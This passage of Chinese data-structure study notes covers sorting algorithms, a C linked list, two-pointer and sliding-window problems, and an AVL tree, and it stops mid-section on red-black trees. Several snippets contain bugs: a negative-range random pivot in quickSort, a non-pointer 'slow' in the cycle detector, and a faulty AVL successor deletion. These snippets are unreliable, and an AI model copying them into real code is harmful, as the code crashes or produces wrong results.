两指针指向各自起始位置 while ((left \u0026lt;= mid) \u0026amp;\u0026amp; (right \u0026lt;= end)){ if (arr[left] \u0026lt;= arr[right]) tmp.push_back(arr[left++]); else tmp.push_back(arr[right++]); // 较小的元素存入临时数组, 较小元素序列指针右移 } while (left \u0026lt;= mid) tmp.push_back(arr[left++]); while (right \u0026lt;= end) tmp.push_back(arr[right++]); // 将剩余元素序列的元素依次存入临时数组 for (Type i : tmp) arr[start++] = i; } 计数排序 非比较方式排序, 而是直接记录元素位置和个数并反向填充原数组, 只适用于整数排序.\n1 2 3 4 5 6 7 8 9 10 11 static void counting(vector\u0026lt;int\u0026gt;\u0026amp; arr) { int max = maximal(arr), min = minimal(arr), range = max - min + 1; static vector\u0026lt;int\u0026gt; cnt(range,0); // 用于记录的数组 for (int i : arr) ++cnt[i - min]; // 记录元素相对位置及个数 for (int i = 0, j = 0; i \u0026lt;= range - 1; ++i) { while (cnt[i]) { arr[j++] = i + min; // 反向填充原数组 --cnt[i]; } } } 桶排序 减少计数排序浪费的空间, 使用映射函数(类似于Hash函数), 映射后分布均匀时效率最高, 桶内部使用插入排序.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 static void bucket(vector\u0026lt;int\u0026gt;\u0026amp; arr) { int max = maximal(arr), min = minimal(arr); int size = (max - min) / int(arr.size()) + 1, num = (max - min) / size + 1; // 确定桶容量和桶个数 vector\u0026lt;int\u0026gt; buckets[num]; for (int i = 0; i \u0026lt;= arr.size() - 1; ++i) { int idx = (arr[i] - min) / size; // 映射函数 buckets[idx].push_back(arr[i]); // 元素入桶 // 桶内使用插入排序 for (int j = int(buckets[idx].size()) - 1; j \u0026gt; 0; --j) { if (buckets[idx][j] \u0026lt; buckets[idx][j - 1]) swap(buckets[idx][j],buckets[idx][j - 1]); } } for (int i = 0, j = 0; i \u0026lt;= num - 1; ++i) { for (int k = 0; k \u0026lt;= int(buckets[i].size()) - 1; ++k) arr[j++] = buckets[i][k]; // 反向填充原数组 } } 基数排序 非比较方式排序, 将元素本身切分并逐部分比较, 除整数外, 还适用于特定格式的字符串和浮点数.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 static void radix(vector\u0026lt;int\u0026gt;\u0026amp; arr) { int max = maximal(arr), digit = 0, shift = 1, size = int(arr.size()); while (max) { max /= 10; ++digit; } // 获取位数 vector\u0026lt;int\u0026gt; tmp(size, 0); // 从低位开始排序 for (int i = 0; i \u0026lt; digit; ++i) { vector\u0026lt;int\u0026gt; cnt(10,0); // 内部使用计数排序 for (int j = 0; j \u0026lt; size; ++j) { int k = (arr[j] / shift) % 10; ++cnt[k]; } for (int j = 1; j \u0026lt; 10; ++j) { cnt[j] = cnt[j - 1] + cnt[j]; } for (int j = size - 1; j \u0026gt;= 0; --j) { int k = (arr[j] / shift) % 10; tmp[cnt[k] - 1] = arr[j]; --cnt[k]; } for (int j = 0; j \u0026lt; size; ++j) { arr[j] = tmp[j]; } shift *= 10; } } 衍生问题 逆序对数量: 在数组 $a[n]$ 中, 若 $0\\leq i\u0026lt;j\\leq n-1$ 且 $a[i] \u0026gt; a[j]$, 则有序对 $(a[i],a[j])$ 被称为逆序对, 现求数组中全部逆序对数量. 在归并过程中累加: \u0026ldquo;cnt += mid - left + 1;\u0026rdquo;\n第 $k$ 大的数: 在不排列数组 $a[n]$ 情况下, 求数组中第 $1\\leq k\\leq n$ 大的数. 快排过程中, 若基准右侧元素个数超过 $k$ 则所求一定在右侧, 忽略左侧递归 - 时间复杂度为 $O(n)$.\n线性表 指针实现链表(C) 以带哨兵节点(头节点)的单向链表为例, 目标为实现如下方法(部分参考C++ STL \u0026lt;list\u0026gt;容器和经典算法题):\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdbool.h\u0026gt; #include \u0026lt;time.h\u0026gt; typedef int ValType; typedef struct node { ValType val; struct node *next; } Node, List; List* init(void); // 初始化链表 bool empty(List* head); // 判断链表为空 void clear(List* head); // 清空链表 void destroy(List* head); // 销毁链表 int size(List* head); // 链表大小 bool traverse(List* head); // 遍历链表 void pushFront(List* head, ValType val); // 头插法 void pushBack(List* head, ValType val); // 尾插法 ValType popFront(List* head); // 头出法 ValType popBack(List* head); // 尾出法 ValType front(List* head); // 头部元素 ValType back(List* head); // 尾部元素 bool insert(List* head, int n, ValType val); // 指定位置插入元素 ValType get(List* head, int n); // 获取指定位置元素 int match(List* head, ValType val); // 寻找匹配的元素 ValType delete(List* head, int n); // 删除指定位置元素 ValType deleteReverse(List *head, int n); // 反序删除指定位置元素 bool resize(List* head, int n); // 重新设置链表大小 bool reverse(List* head); // 翻转链表 bool sort(List* head); // 链表排序 bool unique(List* head); // 删除有序链表中的重复元素 List* splice(List* dest, List* src); // 拼接两个链表 List* merge(List* src1, List* src2); // 合并两个有序链表 各方法的实现如下:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 Node* newNode(ValType val); void quickSort(ValType arr[], int left, int right); Node* newNode(ValType val) { Node* node = (Node*)malloc(sizeof(Node)); node-\u0026gt;val = val; node-\u0026gt;next = NULL; return node; } List* init(void) { List* head = newNode(-1); return head; } bool empty(List* head) { if (head-\u0026gt;next == NULL) return true; return false; } // 保留头节点 void clear(List* head) { while (head-\u0026gt;next) { List* curr = head-\u0026gt;next; head-\u0026gt;next = curr-\u0026gt;next; free(curr); } } // 指针置空 void destroy(List* head) { List* curr = head; while (curr) { head = head-\u0026gt;next; free(curr); curr = head; } } int size(List* head) { int cnt = 0; for (Node* curr = head-\u0026gt;next; curr; curr = curr-\u0026gt;next) ++cnt; return cnt; } bool traverse(List* head) { if (empty(head)) return false; for (Node* curr = head-\u0026gt;next; curr; curr = curr-\u0026gt;next) { printf(\u0026#34;%d \u0026#34;, curr-\u0026gt;val); } printf(\u0026#34;\\n\u0026#34;); return true; } void pushFront(List* head, ValType val) { Node* curr = newNode(val); curr-\u0026gt;next = head-\u0026gt;next; head-\u0026gt;next = curr; } // O(n) void pushBack(List* head, ValType val) { Node* tail = head; while (tail-\u0026gt;next) tail = tail-\u0026gt;next; tail-\u0026gt;next = newNode(val); } ValType popFront(List* head) { if (empty(head)) return -1; Node* curr = head-\u0026gt;next; head-\u0026gt;next = curr-\u0026gt;next; ValType val = curr-\u0026gt;val; free(curr); return val; } // O(n) ValType popBack(List* head) { if (empty(head)) return -1; Node* prev = head; while (prev-\u0026gt;next-\u0026gt;next) prev = prev-\u0026gt;next; ValType val = prev-\u0026gt;next-\u0026gt;val; free(prev-\u0026gt;next); prev-\u0026gt;next = NULL; return val; } ValType front(List* head) { if (empty(head)) return -1; return head-\u0026gt;next-\u0026gt;val; } // O(n) ValType back(List* head) { if (empty(head)) return -1; Node* tail = head; while (tail-\u0026gt;next) tail = tail-\u0026gt;next; return tail-\u0026gt;val; } // 遍历到满足条件的前一个节点 bool insert(List* head, int n, ValType val) { if (empty(head) || n \u0026lt; 1) return false; for (Node* prev = head; prev-\u0026gt;next; prev = prev-\u0026gt;next) { --n; if (n == 0) { Node* new = newNode(val); new-\u0026gt;next = prev-\u0026gt;next; prev-\u0026gt;next = new; return true; } } return false; } ValType get(List* head, int n) { if (empty(head) || n \u0026lt; 1) return -1; for (Node* curr = head-\u0026gt;next; curr-\u0026gt;next; curr = curr-\u0026gt;next) { --n; if (n == 0) { return curr-\u0026gt;val; } } return -1; } int match(List* head, ValType val) { if (empty(head)) return -1; int cnt = 0; for (Node* curr = head-\u0026gt;next; curr-\u0026gt;next; curr = curr-\u0026gt;next) { ++cnt; if (curr-\u0026gt;val == val) return cnt; } return -1; } // 遍历到满足条件的前一个节点 ValType delete(List* head, int n) { if (empty(head) || n \u0026lt; 1) return -1; for (Node* prev = head; prev-\u0026gt;next; prev = prev-\u0026gt;next) { --n; if (n == 0) { Node* del = prev-\u0026gt;next; prev-\u0026gt;next = del-\u0026gt;next; ValType val = del-\u0026gt;val; free(del); return val; } } return -1; } // 双指针法 ValType deleteReverse(List *head, int n) { if (empty(head) || n \u0026lt; 1) return -1; Node* fast = head-\u0026gt;next; for (int i = n - 1; i \u0026gt; 0; --i) { if (fast-\u0026gt;next == NULL) return -1; fast = fast-\u0026gt;next; } Node* slow = head; while (fast-\u0026gt;next) { fast = fast-\u0026gt;next; slow = slow-\u0026gt;next; } Node* curr = slow-\u0026gt;next; slow-\u0026gt;next = curr-\u0026gt;next; ValType val = curr-\u0026gt;val; free(curr); return val; } // 遍历到满足条件的前一个节点 bool resize(List* head, int n) { if (empty(head) || n \u0026lt; 1) return false; for (Node* prev = head; prev-\u0026gt;next; prev = prev-\u0026gt;next) { --n; if (n == 0) { clear(prev-\u0026gt;next); return true; } } return false; } // 三指针迭代法 bool reverse(List* head) { if (empty(head) || empty(head-\u0026gt;next)) return false; Node *prev = NULL, *curr = head-\u0026gt;next; while (curr) { Node* next = curr-\u0026gt;next; curr-\u0026gt;next = prev; prev = curr, curr = next; } head-\u0026gt;next = prev; return true; } // 传入数组使用快排 bool sort(List* head) { if (empty(head) || empty(head-\u0026gt;next)) return false; int arrSize = size(head); ValType* arr = (ValType*)malloc(sizeof(ValType) * arrSize); Node* curr = head-\u0026gt;next; for (int i = 0; i \u0026lt; arrSize; ++i) { arr[i] = curr-\u0026gt;val; curr = curr-\u0026gt;next; } quickSort(arr, 0, arrSize - 1); curr = head-\u0026gt;next; for (int i = 0; i \u0026lt; arrSize; ++i) { curr-\u0026gt;val = arr[i]; curr = curr-\u0026gt;next; } free(arr); return true; } // 遍历到重复值出现的前一个节点 bool unique(List* head) { if (empty(head) || empty(head-\u0026gt;next)) return false; Node* prev = head-\u0026gt;next; while (prev-\u0026gt;next-\u0026gt;next) { if (prev-\u0026gt;val \u0026gt; prev-\u0026gt;next-\u0026gt;val) { return false; } else if (prev-\u0026gt;val == prev-\u0026gt;next-\u0026gt;val) { Node* curr = prev-\u0026gt;next; prev-\u0026gt;next = curr-\u0026gt;next; free(curr); } else { prev = prev-\u0026gt;next; } } return true; } List* splice(List* dest, List* src) { if (empty(dest)) return src; if (empty(src)) return dest; Node* tail = dest; while (tail-\u0026gt;next) tail = tail-\u0026gt;next; tail-\u0026gt;next = src-\u0026gt;next; return dest; } List* merge(List* src1, List* src2) { if (empty(src1)) return src2; if (empty(src2)) return src1; sort(src1), sort(src2); List* dest = init(); Node *curr1 = src1-\u0026gt;next, *curr2 = src2-\u0026gt;next, *tail = dest; while (curr1 \u0026amp;\u0026amp; curr2) { if (curr1-\u0026gt;val \u0026lt; curr2-\u0026gt;val) { tail-\u0026gt;next = curr1; curr1 = curr1-\u0026gt;next; tail = tail-\u0026gt;next; } else { tail-\u0026gt;next = curr2; curr2 = curr2-\u0026gt;next; tail = tail-\u0026gt;next; } } // 将剩余部分直接连接 if (curr1) tail-\u0026gt;next = curr1; if (curr2) tail-\u0026gt;next = curr2; src1-\u0026gt;next = NULL, src2-\u0026gt;next = NULL; return dest; } void quickSort(int arr[], int left, int right) { if (left \u0026gt;= right) return; srand(time(NULL)); int idx = rand() % (left - right) + left; int flag = arr[idx], head = left - 1, tail = right + 1; while (head \u0026lt; tail) { do head++; while(arr[head] \u0026lt; flag); do tail--; while(arr[tail] \u0026gt; flag); if (head \u0026lt; tail) { int tmp = arr[head]; arr[head] = arr[tail]; arr[tail] = tmp; } } quickSort(arr, left, tail); quickSort(arr, tail + 1, right); } 此外, 链表也可以双向, 循环, 无哨兵节点, 有尾指针等.\n作为ADT的线性表 ADT(abstract data structure) 抽象数据结构.\n线性表存储上一般使用STL容器(C++)/数组/链表. 线性表 头插/头出 尾插/尾出 插入/删除 访问 链表(无尾指针) $O(1)$ $O(m)$ $O(n)$ $O(n)$ vector/数组 $O(m)$ $O(1)$ $O(m)$ $O(1)$ 受限线性表: 栈(stack), 后进先出(LIFO); 队列(queue), 先进先出(FIFO). 栈的进栈(push)和出栈(pop)在同侧, 另一侧封住; 一个指针指向栈顶(top); 栈空时指针指向栈底(bot). 队列的入队(push)和出队(pop)在不异侧, 一个指针指向队首(front), 一个指针指向队尾(back); 队列空时, 队首和队尾指向相同. 对顶栈: 将两栈的栈顶相对, 一侧进栈时另一侧出栈. 单调栈: 栈内元素始终保持递增(递减); 出栈/入栈时遍历栈, 时间复杂度为 $O(m)$. 双端队列(double-ended queue): 队首队尾均可入队或出队. 优先队列(priority queue): 队列内元素始终保持递增(递减), 通常使用小根堆(大根堆)实现; 入队/出队时时调整堆, 时间复杂度为 $O(\\log m)$. 循环队列: 并非ADT, 数组模拟队列的技巧, 通过循环移动队首队尾指针, 以 $O(1)$ 的时间复杂度实现入队和出队操作; 队尾(队首)指针或指向最后一个元素(第一个元素)或其后一位(后一位), 但不同实现判断为空和为满的条件有所不同. STL中的线性表 容器 属性 实现 头插/头出 尾插/尾出 插入/删除 访问 遍历 array 顺序 连续内存 不支持 不支持 不支持 $O(1)$ 正向/反向 vector 顺序 连续内存 capacity \u0026gt; size $O(m)$ $O(1)$ $O(m)$ $O(1)$ 正向/反向 list 顺序 双向循环链表 $O(1)$ $O(1)$ $O(n)$ $O(n)$ 正向/反向 forward_list 顺序 单向链表 $O(1)$ $O(m)$ $O(n)$ $O(n)$ 正向 deque 顺序 分段连续内存 $O(1)$ $O(1)$ 不支持 $O(1)$ 不支持 stack 适配器 默认底层为deque 出入栈 $O(1)$ 不支持 不支持 不支持 不支持 queue 适配器 默认底层为deque 出队 $O(1)$ 入队 $O(1)$ 不支持 不支持 不支持 priority_queue 适配器 默认底层为vector大根堆 出队 $O(\\log m)$ 入队 $O(\\log m)$ 不支持 不支持 不支持 迭代器: iterator, reverse_iterator. 赋值方法: assign(), swap(). 容量方法: size(), empty(), resize(), capacity(), reserve(). 读取方法: at(), operator(), front(), back(), top(). 增删方法: push_front(), pop_front(), push_back(), pop_back(), push(), pop(), insert(), erase(), remove(), clear(). 衍生问题 双指针法 使用双指针同时遍历 (并剪枝), 以便将时间复杂度 $O(n^2)$ 降至 $O(n)$. 反转字符串, 翻转数组, 快速排序, 三数之和, 四数之和 - 头尾指针. 合并有序链表 - 两个头指针. 翻转单向链表 - 三指针迭代. 单向链表倒数第 $n$ 个节点, 链表相交, 环形链表, 删除数组中特定元素 - 快慢指针. 四数之和: 返回数组中和为 $s$ 的所有四个整数 (四元组不能重复) - 时间复杂度 $O(n^3)$.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; fourSum(vector\u0026lt;int\u0026gt;\u0026amp; nums, int target) { vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; result; sort(nums.begin(), nums.end()); for (int i = 0; i \u0026lt; nums.size(); ++i) { // 1级剪枝处理 if (nums[i] \u0026gt; target \u0026amp;\u0026amp; nums[i] \u0026gt;= 0) break; // 1级去重 if (i \u0026gt; 0 \u0026amp;\u0026amp; nums[i] == nums[i - 1]) continue; for (int j = i + 1; j \u0026lt; nums.size(); ++j) { // 2级剪枝处理 if (nums[i] + nums[j] \u0026gt; target \u0026amp;\u0026amp; nums[i] + nums[j] \u0026gt;= 0) break; // 2级去重 if (j \u0026gt; i + 1 \u0026amp;\u0026amp; nums[j] == nums[j - 1]) continue; int left = j + 1, right = nums.size() - 1; while (right \u0026gt; left) { // 考虑溢出 if ((long) nums[i] + nums[j] + nums[left] + nums[right] \u0026gt; target) --right; // 考虑溢出 else if ((long) nums[i] + nums[j] + nums[left] + nums[right] \u0026lt; target) ++left; else { result.push_back(vector\u0026lt;int\u0026gt;{nums[i], nums[j], nums[left], nums[right]}); // 三级去重 while (right \u0026gt; left \u0026amp;\u0026amp; nums[right] == nums[right - 1]) right--; while (right \u0026gt; left \u0026amp;\u0026amp; nums[left] == nums[left + 1]) left++; // 找到答案, 同时内收 right--; left++; } } } } return result; } 环形链表: 返回链表中单环的入点 - 时间复杂度 $O(n)$.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ListNode *detectCycle(ListNode *head) { ListNode* fast = head, slow = head; while(fast != NULL \u0026amp;\u0026amp; fast-\u0026gt;next != NULL) { slow = slow-\u0026gt;next; fast = fast-\u0026gt;next-\u0026gt;next; // 快慢指针相遇处 if (slow == fast) { ListNode* begin = head; ListNode* end = fast; while (begin != end) { // 环入口处 begin = begin-\u0026gt;next; end = end-\u0026gt;next; } return begin; } } return NULL; } 滑动窗口 满足条件的最小连续子串/子数组: 扩大窗口找到可行解, 缩小窗口优化可行解. 满足条件的最小连续子串/子数组: 扩大窗口直至不满足条件, 再进行移动. 最小连续子数组: 返回数组中和为 $s$ 的最小连续长度子数组 - 时间复杂度 $O(n)$.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 int minSubArrayLen(int target, vector\u0026lt;int\u0026gt;\u0026amp; nums) { int n = nums.size(); if (n == 0) { return 0; } int ans = INT_MAX, left = 0, right = 0, sum = 0; while (right \u0026lt; n) { sum += nums[right]; while (sum \u0026gt;= target) { ans = min(ans, right - left + 1); sum -= nums[left]; ++left; } ++right; } return ans == INT_MAX ? 0 : ans; } 最大连续 $1$ 数列: 0-1数列中最多可将 $k$ 个 $0$ 变为 $1$, 返回最长的连续 $1$ 子数列长度 - 时间复杂度 $O(n)$.\n1 2 3 4 5 6 7 8 9 10 11 12 int findMaxConsecutiveOnes(int k, vector\u0026lt;int\u0026gt;\u0026amp; nums) { int ans = 0, left = 0, zeroNum = 0; for (int right = 0; right \u0026lt;= nums.size(); ++right) { if (nums[right] == 0) zeroNum++; while (zeroNum \u0026gt; k) { if (nums[left] == 0) zeroNum--; left++; } ans = max(ans, right - left + 1); } return ans; } 四则运算 使用栈将中缀表达式变为后缀表达式: 优先级高于或等于栈顶符号(左括号)入栈, 优先级低于栈顶符号(右括号)时弹出栈顶元素, 直至高于或等于(弹出左括号)再入栈(右括号不入栈).\n使用栈直接计算后缀表达式: 数字入栈, 遇到符号时弹出两个数字, 将运算结果入栈; 栈中最后只剩一个元素, 即为所求.\n搜索 BFS(Breadth First Search): 广度优先搜索, 使用队列记录搜索结果; 当前节点出队, 当前节点的子节点入队. DFS(Depth First Search): 深度优先搜索, 使用栈记录搜索结果; 节点入栈, 通过出栈实现回溯.\n查找 顺序表 二分查找, 线性插值, Fibonacci\n平衡树 指针实现AVL树(C) 最理想的平衡二叉树(左右子树深度差始终 $\u0026lt;1$), 但插入和删除时需要大量\u0026quot;旋转\u0026quot;(常数次), 平均时间复杂度为 $O(\\log{n})$; 应用于windows内核.\n目标为实现如下方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdbool.h\u0026gt; typedef int ValType; typedef struct node { ValType val; int height; struct node *left, *right; } Node, Tree; // 递归法实现: 前序, 中序, 后序遍历 void preorderTraverse(Tree *root); void inorderTraverse(Tree *root); void postorderTraverse(Tree *root); // 迭代法 (栈) 实现: 前序, 中序, 后序遍历 void levelTraverse(Tree *root); void preorderIteration(Tree *root); void inorderIteration(Tree *root); // 迭代法 (队列) 实现: 层次遍历 void postorderIteration(Tree *root); Tree *insert(Tree *root, ValType val); Tree *delete(Tree *root, ValType val); Tree *destroy(Tree* root); 各方法具体实现如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 // 定义循环双端序列及方法, 可兼顾栈与队列 #define MAXSIZE 1000 typedef struct { Node *arr[MAXSIZE]; int front, back; } Deque; bool isDequeEmpty(Deque *deque) { return deque-\u0026gt;front == deque-\u0026gt;back; } Deque *initDeque(void) { Deque *deque = (Deque*) malloc(sizeof(Deque)); deque-\u0026gt;back = deque-\u0026gt;front = 0; return deque; } void pushBack(Deque *deque, Node *node) { deque-\u0026gt;arr[++deque-\u0026gt;back] = node; if (deque-\u0026gt;back == MAXSIZE - 1) deque-\u0026gt;back = 0; if (deque-\u0026gt;back == deque-\u0026gt;front) exit(-1); } Node *popBack(Deque *deque) { if (isDequeEmpty(deque)) return NULL; Node *node = deque-\u0026gt;arr[deque-\u0026gt;back--]; if (deque-\u0026gt;back == -1) deque-\u0026gt;back = MAXSIZE - 1; return node; } Node *popFront(Deque *deque) { if (isDequeEmpty(deque)) return NULL; Node *node = deque-\u0026gt;arr[++deque-\u0026gt;front]; if (deque-\u0026gt;front == MAXSIZE - 1) deque-\u0026gt;front = 0; return node; } void preorderTraverse(Tree *root) { if (!root) return; printf(\u0026#34;%d \u0026#34;, root-\u0026gt;val); preorderTraverse(root-\u0026gt;left); preorderTraverse(root-\u0026gt;right); } void inorderTraverse(Tree* root) { if (!root) return; inorderTraverse(root-\u0026gt;left); printf(\u0026#34;%d \u0026#34;, root-\u0026gt;val); inorderTraverse(root-\u0026gt;right); } void postorderTraverse(Tree *root) { if (!root) return; postorderTraverse(root-\u0026gt;left); postorderTraverse(root-\u0026gt;right); printf(\u0026#34;%d \u0026#34;, root-\u0026gt;val); } // 后序遍历 Tree *destroy(Tree *root) { if (root) { destroy(root-\u0026gt;left); destroy(root-\u0026gt;right); free(root); } return NULL; } // 迭代法实现dfs, 本质为用栈模拟递归函数栈帧结构 void preorderIteration(Tree *root) { Deque *stack = initDeque(); if (root) pushBack(stack, root); while (!isDequeEmpty(stack)) { Node *node = popBack(stack); if (node) { // 按照右, 左, 根, 空顺序入栈 if (node-\u0026gt;right) pushBack(stack, node-\u0026gt;right); if (node-\u0026gt;left) pushBack(stack, node-\u0026gt;left); pushBack(stack, node); pushBack(stack, NULL); } else { node = popBack(stack); printf(\u0026#34;%d \u0026#34;, node-\u0026gt;val); } } } void inorderIteration(Tree *root) { Deque *stack = initDeque(); if (root) pushBack(stack, root); while (!isDequeEmpty(stack)) { Node *node = popBack(stack); if (node) { // 按照右, 根, 空, 左顺序入栈 if (node-\u0026gt;right) pushBack(stack, node-\u0026gt;right); pushBack(stack, node); pushBack(stack, NULL); if (node-\u0026gt;left) pushBack(stack, node-\u0026gt;left); } else { node = popBack(stack); printf(\u0026#34;%d \u0026#34;, node-\u0026gt;val); } } } void postorderIteration(Tree *root) { Deque *st = initDeque(); if (root) pushBack(st, root); while (!isDequeEmpty(st)) { Node *node = popBack(st); if (node) { // 按照根, 空, 右, 左顺序入栈 pushBack(st, node); pushBack(st, NULL); if (node-\u0026gt;right) pushBack(st, node-\u0026gt;right); if (node-\u0026gt;left) pushBack(st, node-\u0026gt;left); } else { node = popBack(st); printf(\u0026#34;%d \u0026#34;, node-\u0026gt;val); } } } void levelTraverse(Tree *root) { Deque *que = initDeque(); if (root) pushBack(que, root); while (!isDequeEmpty(que)) { // 记录当前层节点数 int size = (que-\u0026gt;back + MAXSIZE - que-\u0026gt;front) % MAXSIZE; for (int i = 0; i \u0026lt; size; ++i) { Node *node = popFront(que); printf(\u0026#34;%d %d \u0026#34;, node-\u0026gt;val, node-\u0026gt;height); if (node-\u0026gt;left) pushBack(que, node-\u0026gt;left); if (node-\u0026gt;right) pushBack(que, node-\u0026gt;right); } printf(\u0026#34;\\n\u0026#34;); } } int maxi(int a, int b) { return a \u0026gt; b ? a : b; } int getHeight(Tree *root) { if (!root) return 0; return root-\u0026gt;height; } // 平衡因子: 左子树高度 - 右子树高度 int getFactor(Tree *root) { return getHeight(root-\u0026gt;left) - getHeight(root-\u0026gt;right); } // 根据左右孩高度更新根高度 void updateHeight(Tree *root) { int hl = getHeight(root-\u0026gt;left); int hr = getHeight(root-\u0026gt;right); root-\u0026gt;height = maxi(hl, hr) + 1; } // LL型, 即右旋 Tree *LLRotate(Tree *root) { Node *node = root-\u0026gt;left; root-\u0026gt;left = node-\u0026gt;right; node-\u0026gt;right = root; updateHeight(root); updateHeight(node); return node; } // RR型, 即左旋 Tree *RRRotate(Tree *root) { Node *node = root-\u0026gt;right; root-\u0026gt;right = node-\u0026gt;left; node-\u0026gt;left = root; updateHeight(root); updateHeight(node); return node; } // LR型, 即左孩左旋后根右旋 Tree *LRRotate(Tree *root) { root-\u0026gt;left = RRRotate(root-\u0026gt;left); return LLRotate(root); } // RL型, 即右孩右旋后根左旋 Tree *RLRotate(Tree *root) { root-\u0026gt;right = LLRotate(root-\u0026gt;right); return RRRotate(root); } // 插入时维护平衡 Tree *balanceInsert(Tree *root, ValType val) { if (root) { int factor = getFactor(root); if (factor \u0026gt; 1) { if (val \u0026lt; root-\u0026gt;left-\u0026gt;val) root = LLRotate(root); else if (val \u0026gt; root-\u0026gt;left-\u0026gt;val) root = LRRotate(root); } else if (factor \u0026lt; -1) { if (val \u0026lt; root-\u0026gt;right-\u0026gt;val) root = RLRotate(root); else if (val \u0026gt; root-\u0026gt;right-\u0026gt;val) root = RRRotate(root); } } return root; } Tree *insert(Tree *root, ValType val) { if (!root) { Node* node = (Node*) malloc(sizeof(Node)); node-\u0026gt;val = val, node-\u0026gt;height = 1; // 叶子节点高度为1 node-\u0026gt;left = node-\u0026gt;right = NULL; return node; } if (val \u0026lt; root-\u0026gt;val) { root-\u0026gt;left = insert(root-\u0026gt;left, val); updateHeight(root); // 递归返回时更新根节点高度 return balanceInsert(root, val); // 维护当前子树平衡 } if (val \u0026gt; root-\u0026gt;val) { root-\u0026gt;right = insert(root-\u0026gt;right, val); updateHeight(root); return balanceInsert(root, val); } return root; } // 删除时维护平衡 Tree *balanceDelete(Tree *root) { if (root) { int factor = getFactor(root); if (factor \u0026gt; 1) { int subFact = getFactor(root-\u0026gt;left); // 将中间情况并入操作较少的情况中 if (subFact \u0026gt;= 0) root = LLRotate(root); else root = LRRotate(root); } else if (factor \u0026lt; -1) { int subFact = getFactor(root-\u0026gt;right); if (subFact \u0026gt; 0) root = RLRotate(root); // 将中间情况并入操作较少的情况中 else root = RRRotate(root); } } return root; } Tree *delete(Tree *root, ValType val) { if (!root) return NULL; if (val \u0026lt; root-\u0026gt;val) { root-\u0026gt;left = delete(root-\u0026gt;left, val); updateHeight(root); // 递归返回时更新根节点高度 return balanceDelete(root); // 维护当前子树平衡 } else if (val \u0026gt; root-\u0026gt;val) { root-\u0026gt;right = delete(root-\u0026gt;right, val); updateHeight(root); return balanceDelete(root); } else { Node *lc = root-\u0026gt;left, *rc = root-\u0026gt;right; if (!lc \u0026amp;\u0026amp; !rc) { // 叶子节点 free(root); return NULL; } else if (!lc) { // 只有右子树 free(root); return rc; } else if (!rc) { // 只有左子树 free(root); return lc; } else { Node *prcMin = root; if (prcMin-\u0026gt;right-\u0026gt;left) { prcMin = prcMin-\u0026gt;right; while (prcMin-\u0026gt;left-\u0026gt;left) prcMin = prcMin-\u0026gt;left; } // 找到后驱节点的父节点, 即右子树最小节点的父节点 root-\u0026gt;val = prcMin-\u0026gt;left-\u0026gt;val; free(prcMin-\u0026gt;left); // 避免出现野指针 prcMin-\u0026gt;left = NULL; return root; } } } STL中的RB树 (未完) 弱平衡二叉树, 牺牲一定的查询性能减少插入和删除时的\u0026quot;旋转\u0026quot;次数; STL中的关联式容器均使用此结构; 应用于 Linux 内核.\n2-3树: 存在2-节点(1值2孩)和3-节点(2值3孩); 向上生长. 平衡规则: 左右子树高度相等. 插入: 插入2-节点时变为3-节点; 插入3-节点时先变为4-节点, 4-节点向上分解为3个2-节点, 并将根2-节点向上插入, 直到树中无4-节点; 插入路径均为3-节点时, 树高度加 $1$. 删除: 3-节点可直接删除; 删除2-节点时将后驱节点逐个前移, 3-节点向下分解; 只剩2-节点时, 